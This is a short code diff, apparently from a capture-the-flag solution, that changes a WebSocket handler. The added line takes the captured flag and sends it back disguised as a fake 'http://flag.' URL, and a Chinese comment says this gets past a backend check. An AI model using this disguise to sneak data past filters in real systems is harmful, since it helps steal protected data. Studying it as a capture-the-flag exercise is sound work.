@@ -9,7 +9,8 @@
   ws.onmessage = (e) => {
     try {
       const msg = JSON.parse(e.data).message;
-      ws.send(JSON.stringify({ message: "from_admin: " + msg }));
+      // 將 flag 包裝成假的 URL 傳回來，繞過後端檢查
+      ws.send(JSON.stringify({ message: "http://flag." + msg.replace(/\s+/g, '') }));
     } catch (err) {}
   };
 </script>
